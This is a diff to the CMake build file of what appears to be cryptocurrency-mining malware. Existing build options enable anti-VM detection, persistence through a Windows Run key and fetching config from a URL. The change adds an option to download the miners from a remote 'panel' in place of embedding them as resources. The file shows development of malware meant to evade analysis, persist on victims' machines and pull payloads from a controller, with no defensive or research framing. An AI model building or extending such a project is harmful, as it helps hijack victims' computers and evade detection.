@@ -30,6 +30,13 @@ option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)
 # Optional Persistence feature
 option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)
 
+# Optional Remote Miners feature
+option(ENABLE_REMOTE_MINERS "Download miners from panel instead of embedding" OFF)
+if(ENABLE_REMOTE_MINERS)
+    message(STATUS "Remote miners enabled - miners will be downloaded from panel")
+    add_definitions(-DENABLE_REMOTE_MINERS)
+endif()
+
 # Optional GET Config URL feature
 set(CONFIG_GET_URL "" CACHE STRING "Direct GET URL for config fetching (instead of POST)")
 if(CONFIG_GET_URL)
@@ -50,10 +57,16 @@ set(SRC_FILES
     src/config_manager.cpp
 )
 
-# Resource files
-set(RESOURCE_FILES
-    resources/embedded_resource.rc
-)
+# Resource files (only if not using remote miners)
+if(NOT ENABLE_REMOTE_MINERS)
+    set(RESOURCE_FILES
+        resources/embedded_resource.rc
+    )
+    message(STATUS "Embedding miner resources in executable")
+else()
+    set(RESOURCE_FILES)
+    message(STATUS "Skipping resource embedding - using remote download")
+endif()
 
 # Header files
 set(HEADER_FILES
